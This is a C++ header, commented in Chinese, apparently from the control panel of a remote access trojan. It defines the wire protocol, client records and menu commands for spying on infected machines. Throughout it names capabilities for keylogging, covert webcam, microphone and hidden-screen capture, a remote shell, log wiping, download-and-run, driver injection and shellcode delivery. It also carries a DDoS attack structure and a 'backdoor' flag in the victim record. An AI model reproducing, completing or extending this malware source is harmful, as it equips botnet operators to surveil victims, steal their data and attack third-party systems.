#pragma once
#include "Buffer.h"
// BYTE最大也就256
enum MAIN
{
	TOKEN_CONDITION,			//数据更新
	TOKEN_ERROR,				//客户端反馈信息
	TOKEN_PROCESS,				//进程
	TOKEN_GNDESKTOP,			//桌面截图预览
	TOKEN_GETVERSION,			//获取版本
	TOKEN_SENDLL,				//发送DLL数据
	TOKEN_LOGIN,				//上线

	TOKEN_DRIVE_LIST,			//文件传输
	TOKEN_WEBCAM_BITMAPINFO,	//摄像头
	TOKEN_AUDIO_START,			//麦克风
	TOKEN_SPEAK_START,			//扬声器
	TOKEN_KEYBOARD_START,		//键盘记录
	TOKEN_PSLIST,				//系统管理
	TOKEN_SHELL_START,			//远程终端
	TOKEN_SYSINFOLIST,			//主机管理
	TOKEN_CHAT_START,			//远程交谈
	TOKEN_REGEDIT,				//注册表管理 
	TOKEN_PROXY_START,			//代理
	TOKEN_DDOS,					//压力测试
	TOKEN_INJECT,				//注入管理

	TOKEN_MONITOR,				//屏幕监控
	TOKEN_BITMAPINFO_DIF,		//差异屏幕
	TOKEN_BITMAPINFO_QUICK,		//高速屏幕
	TOKEN_BITMAPINFO_PLAY,		//娱乐屏幕
	TOKEN_BITMAPINFO_HIDE,		//后台屏幕


	TOKEN_KERNEL = 100,			//驱动功能


	TOKEN_EXPAND = 200,				//所有扩展插件
	TOKEN_HEARTBEAT,				//心跳
	TOKEN_ACTIVED,					//激活
	TOKEN_GETAUTODLL,				//自动任务
	TOKEN_NOTHING = 255,			//0
};


enum  KernelManager
{
	COMMAND_DLLMAIN,
	COMMAND_SENDLL,
	COMMAND_CLOSESOCKET,
	COMMAND_GET_PROCESSANDCONDITION,
	COMMAND_GET_SCREEN,
	COMMAND_UPLOAD_EXE,
	COMMAND_DOWN_EXE,
	COMMAND_RENAME,
	COMMAND_FILTERPROCESS,
	COMMAND_MONITOR,
	COMMAND_GETMONITOR,
	COMMAND_CLEANLOG,
	COMMAND_RESTART,
	COMMAND_EXIT,
	COMMAND_LOGOUT,
	COMMAND_REBOOT,
	COMMAND_SHUTDOWN,
	COMMAND_CHANGELOAD,
	COMMAND_CHANGEINFO,
	COMMAND_ADDCLIENT,
	COMMAND_SET_DOOR_GETPERMINSSION = 100,
	COMMAND_SET_DOOR_QUITPERMINSSION,

};





enum e_socket
{
	tcp,
	udp,
};


#define	NC_CLIENT_CONNECT		0x0001
#define	NC_CLIENT_DISCONNECT	0x0002
#define	NC_TRANSMIT				0x0003
#define	NC_RECEIVE				0x0004
#define NC_RECEIVE_COMPLETE		0x0005 // 完整接收
#define NC_SEND_SHELCODE_32		0x0006 // 发送shellcode
#define NC_SEND_SHELCODE_64		0x0007 // 发送shellcode


#define	MAX_WRITE_RETRY		15		// 重试写入文件次数
#define MAX_SEND_BUFFER		65535	// 最大发送数据长度 1024*64
#define	MAX_RECV_BUFFER		65535 // 最大接收数据长度

class CLock
{
public:
	CLock(CRITICAL_SECTION& cs)
	{
		m_pcs = &cs;
		EnterCriticalSection(m_pcs);
	}
	~CLock()
	{
		LeaveCriticalSection(m_pcs);
	}
protected:
	CRITICAL_SECTION* m_pcs;
};


//自旋锁
typedef struct _cl_cs {
	LONG bLock;
	DWORD ownerThreadId;
	LONG lockCounts;
	_cl_cs::_cl_cs()
	{
		bLock = FALSE;
		ownerThreadId = 0;
		lockCounts = 0;
	}
	_cl_cs::~_cl_cs()
	{

	}

	void enter() {
		auto cid = GetCurrentThreadId();
		if (ownerThreadId != cid) {
			while (InterlockedExchange(&bLock, TRUE) == TRUE);
			//Sleep(0);
			ownerThreadId = cid;
		}
		++lockCounts;
	}
	void leave() {
		auto cid = GetCurrentThreadId();
		if (cid != ownerThreadId)
			return;
		--lockCounts;
		if (lockCounts == 0) {
			ownerThreadId = 0;
			bLock = FALSE;
		}
	}
	inline void lock() { enter(); }
	inline void unlock() { leave(); }
}CLCS, * PCLCS;

template<class CLockObj> class CLocalLock
{
public:
	CLocalLock(CLockObj& obj) : m_lock(obj) { m_lock.lock(); }
	~CLocalLock() { m_lock.unlock(); }
private:
	CLockObj& m_lock;
};

typedef CLocalLock<_cl_cs>					CCriSecLock;

enum IOType
{
	IOInitialize,
	IORead,
	IOWrite,
	IOIdle
};


class OVERLAPPEDPLUS
{
public:
	OVERLAPPED			m_ol;
	IOType				m_ioType;

	OVERLAPPEDPLUS(IOType ioType) {
		ZeroMemory(this, sizeof(OVERLAPPEDPLUS));
		m_ioType = ioType;
	}
};

typedef struct
{
	BYTE			Btoken;			//协议
	TCHAR			N_ip[255];		//内外IP
	TCHAR			ip[20];			//公网IP
	TCHAR			addr[40];		//位置
	TCHAR			UserActive[15];	//活跃状态
	TCHAR			CptName[50];	//计算机名
	TCHAR			OsName[50];		//系统名
	TCHAR			OSVersion[30];	//系统
	TCHAR			CPU[60];		//CPU
	TCHAR			DAM[200];		//硬盘+内存
	TCHAR			GPU[150];		//显卡
	TCHAR			Window[255];	//当前窗口
	TCHAR			Group[50];		//分组
	TCHAR			Version[50];	//版本
	TCHAR			Remark[50];		//备注
	TCHAR			m_Time[50];		//运行时间
	TCHAR			ExeAndOs[10];	//程序和系统是否为64位
	TCHAR			Process[50];	//进程权限用户
	TCHAR			ProcPath[250];	//进程路径
	TCHAR			pid[10];		//进程ID
	TCHAR			IsWebCam[4];	//摄像头
	TCHAR			Chat[255];		//聊天
	TCHAR			Virus[50];		//杀毒
	TCHAR			lpLCData[32];	//系统语言
	TCHAR			Monitors[255];	//显示器信息
	TCHAR			szSysdire[50];	//系统目录
	TCHAR			szHWID[49];		//HWID
	BOOL			backdoor;		//后门标志
}LOGININFO;

struct ClientContext
{
	ULONG_PTR			m_Socket;
	// Store buffers
	CBuffer				m_WriteBuffer;
	CBuffer				m_CompressionBuffer;	// 接收到的压缩的数据
	CBuffer				m_DeCompressionBuffer;	// 解压后的数据

	//WSABUF				m_wsaInBuffer;
	//BYTE				m_byInBuffer[MAX_RECV_BUFFER];
	//WSABUF				m_wsaOutBuffer;

	int					m_Dialog[2]; // 放对话框列表用，第一个int是类型，第二个是CDialog的地址
	int					m_allpack_rev;
	long long			m_alldata_rev;
	int					m_allpack_send;
	long long			m_alldata_send;

	int				IsConnect;
	CLCS				m_clcs_send_rec_close;

	DWORD				dwID;
	BYTE				m_bProxyConnected;
	BOOL				m_bIsMainSocket; // 是不是主socket
	BOOL				m_bIsSys; 
	e_socket				switchsocket;
	TCHAR szAddress[20];    //远程地址
	USHORT usPort;			//远程端口
	PVOID m_server;
	byte m_password[10];	//通信密码

	TCHAR m_ip[255];		//插件地址
	USHORT m_port;			//插件端口
	BOOL	bisx86;			//客户位数
	LOGININFO* LoginInfo;  //信息备份


	byte* ScreenPicture;	//缩略图
	int PictureSize;
	int	iScreenWidth;
	int	iScreenHeight;

	//更新窗口
	void* pView;
	CXTPReportRecord* pRecord_old;
	CXTPReportRecordItem* Item_cmp_old_Context;   //第0项 绑定上下文数据
	CXTPReportRecordItem* Item_cmp_old_IsActive;  //活跃状态
	CXTPReportRecordItem* Item_cmp_old_winodow;	  //窗口更新
	CXTPReportRecordItem* Item_cmp_old_m_Time;	  //线&反馈

};
typedef struct MESSAGE
{
	DWORD       msg_id;
	char		addr[255];
	int			port;
	int			time;
	int			thread;
	int			pt;
	int			updatedns;
	char		zdy[256];
	char		url[256];
	int			s;
	int			s2;
	int			onedata;
	bool		recvdata;
	char		yfcs[256];
	char		cookiescs[256];
}IMESSAGE;

typedef struct DDOS_HEAD
{
	TCHAR Target[400];    //攻击目标
	WORD AttackPort;     //攻击端口
	WORD AttackType;     //攻击类型
	WORD AttackThread;   //攻击线程
	WORD AttackTime;     //攻击时间
	CHAR SendData[2000]; //发送的数据包
	WORD DataSize;       //数据包大小
	DWORD ExtendData1;   //附加数据
	DWORD ExtendData2;   //附加数据
}ATTACK, * LPATTACK;





enum
{

	WM_ADDTOMAINLIST = WM_USER + 102,	// 添加到列表视图中
	WM_DESKTOPPOPUP,					//显示弹窗

	WM_ADDFINDGROUP,				// 上线时查找分组
	WM_DELFINDGROUP,				// 下线时查找分组
	WM_REMOVEFROMLIST,				// 从列表视图中删除

	WM_OPENSCREENSPYDIALOG_DIF,		//差异屏幕
	WM_OPENSCREENSPYDIALOG_QUICK,	//高速屏幕
	WM_OPENSCREENSPYDIALOG_PLAY,	//娱乐屏幕
	WM_OPENSCREENSPYDIALOG_HIDE,	//后台屏幕

	WM_OPENMANAGERDIALOG,			// 文件管理
	WM_OPENWEBCAMDIALOG,			// 打开摄像头监视窗口
	WM_OPENAUDIODIALOG,				// 打开语音监听窗口
	WM_OPENSPEAKERDIALOG,			//打开扬声器监听窗口
	WM_OPENKEYBOARDDIALOG,			// 打开键盘记录窗口
	WM_OPENSYSTEMDIALOG,			// 打开进程管理窗口
	WM_OPENSHELLDIALOG,				// 打开shell窗口
	WM_OPENSYSINFODIALOG,			// 打开服务器信息窗口
	WM_OPENREGEDITDIALOG,           // 打开注册表管理窗口
	WM_OPENDLLDLG,                  // 打开功能控件加载窗口
	WM_OPENCHATDIALOG,		    	// 打开交谈窗口
	WM_OPENQQINFODIALOG,			// 打开QQ好友信息窗口
	WM_OPENPROXYDIALOG,				//打开代理窗口
	WM_OPENPYSINFOLISTDIALOG,		//系统管理
	WM_OPENPEXPANDDIALOG,			// 互动插件

	WM_OPENPKERNELDIALOG,			// 驱动插件

	WM_DDOS_CLIENT,					//DDOS窗口消息
	WM_MONITOR_CLIENT,				//监控窗口消息
	WM_MONITOR_CHANGECLIENT,		//重复登录替换下监控窗口消息

	//////////////////////////////////////////////////////////////////////////
	FILEMANAGER_DLG = 1,	//文件管理
	SCREENSPY_DIF_DLG,		//差异屏幕
	SCREENSPY_QUICK_DLG,	//高速屏幕
	SCREENSPY_PLAY_DLG,		//娱乐屏幕
	SCREENSPY_HIDE_DLG,		//后台屏幕
	WEBCAM_DLG,				//摄像头
	AUDIO_DLG,				//麦克风
	SPEAKER_DLG,			//扬声器 
	CHAT_DLG,				//对话
	SHELL_DLG,				//终端
	PROXY_DLG,				//代理
	KEYBOARD_DLG,			//键盘	
	REGEDIT_DLG,			//注册表
	MACHINE_DLG,			//系统管理
	EXPAND_DLG,				//互动插件
	KERNEL_DLG,				//驱动插件
	MONITOR_DLG,			//屏幕监控离开
	DDDOS_DLG_IN,			//DDOS加入
	DDDOS_DLG_OUT,			//DDOS离开
};



typedef struct
{
	BYTE			Btoken;			//协议
	TCHAR			UserActive[15];	//状态
	TCHAR			Window[250];	//当前窗口
	int				iScreenWidth;
	int				iScreenHeight;
	bool			bsomes[20];
}DATAUPDATE;


typedef struct
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	BOOL    error;
}FILESIZE;



enum SENDTASK
{
	TASK_MAIN,					//普通插件方式 带1个普通导出函数名 不带参数
	TASK_PLUG,					//扩展插件加载标志
};


struct DllSendDate
{
	SENDTASK sendtask;
	TCHAR DllName[255];			 //DL名称
	BOOL is_64;					//位数
	int DateSize;				//DLL大小
	TCHAR szVersion[50];		//版本
	TCHAR szcommand[1000];
	int i;
};





struct SendErrorDate
{
	BYTE Btoken;
	TCHAR ErrorDate[255];

};
struct serverstartdate
{
	CString ip, m_net, port;
};



struct  portinfo
{
	TCHAR ip[255];
	TCHAR m_net[30];
	TCHAR port[30];
	TCHAR isok[30];
};



struct MYtagMSG { //自定义控制消息


	UINT        lParam;
	UINT        message;
	long long      wParam;
	int x;
	int y;
};


struct  WINDOWSINFO
{
	TCHAR strTitle[1024];
	DWORD m_poceessid;
	DWORD m_hwnd;
	bool canlook;
	int w;
	int h;
};

struct  EXPANDLAYOUT
{
	byte token;
	TCHAR strTitle[30];     //标题
	int win_w, win_h;		//窗口大小

	int edit_in_x, edit_in_y, edit_in_w, edit_in_h;	//输入
	bool bedit_in_show;// 是否显示

	int edit_out_x, edit_out_y, edit_out_w, edit_out_h;//输出
	bool bedit_out_show;// 是否显示

	TCHAR str_button_get_Title[30];						//获取按钮
	int button_get_x, button_get_y, button_get_w, button_get_h;
	bool bbutton_get_show;// 是否显示

	TCHAR str_button_set_Title[30];						//设置按钮
	int button_set_x, button_set_y, button_set_w, button_set_h;
	bool bbutton_set_show;// 是否显示

	int list_x, list_y, list_w, list_h;//列表框
	bool blist_show;// 是否显示

	int Columns;// 留着备用哦
	int menus;// 留着备用哦

};

struct SColumns
{
	TCHAR title[30];
	int w;
};

struct COPYCLIENT
{
	byte token;
	TCHAR confimodel[1000];
};


#define net_msg
class __declspec(novtable) CIOMessageMap
{
public:
	virtual bool ProcessIOMessage(IOType clientIO, ClientContext* pContext, DWORD dwSize) = 0;
};

#define BEGIN_IO_MSG_MAP() \
public: \
		bool ProcessIOMessage(IOType clientIO, ClientContext* pContext, DWORD dwSize = 0) \
		{ \
			bool bRet = false; 

#define IO_MESSAGE_HANDLER(msg, func) \
			if (msg == clientIO) \
				bRet = func(pContext, dwSize); 

#define END_IO_MSG_MAP() \
		return bRet; \
	}




#define MENU_桌面预览							100
#define MENU_复制全部							150
#define MENU_复制IP								152
#define MENU_复制聊天							154
#define MENU_复制名称							156
#define MENU_复制显卡							158
#define MENU_复制编号							160

#define MENU_获取状态							201
#define MENU_加入监控							203
#define MENU_退出监控							204
#define MENU_文件管理							1000
#define MENU_差异屏幕							1010
#define MENU_高速屏幕							1020
#define MENU_娱乐屏幕							1025
#define MENU_后台屏幕							1030
#define MENU_播放监听							1040
#define MENU_语音监听							1050
#define MENU_视频查看							1060
#define MENU_系统管理							1080
#define MENU_远程终端							1110
#define MENU_键盘记录							1120
#define MENU_查注册表							1130
#define MENU_代理映射							1140
#define MENU_远程交谈							1150
#define MENU_下载运行							1897
#define MENU_上传运行							1898
#define MENU_清理日志							1899
#define MENU_重新运行							1901
#define MENU_断开测试							1902
#define MENU_卸载								1903
#define MENU_移机								1905
#define MENU_复机								1906
#define MENU_获取控制权							1910
#define MENU_恢复控制权							1911
#define MENU_注销								2001
#define MENU_重启								2002
#define MENU_关机								2003

#define MENU_驱动插件							2560
#define MENU_压力测试							2650

#define MENU_修改分组							3020
#define MENU_修改备注							3021

#define MENU_取消帅选							3100
#define MENU_帅选进程							3101

#define MENU_特别关注							3120
#define MENU_运行方式							3130




#define MENU_KERNEL_注入						5001
#define MENU_KERNEL_备注						5011
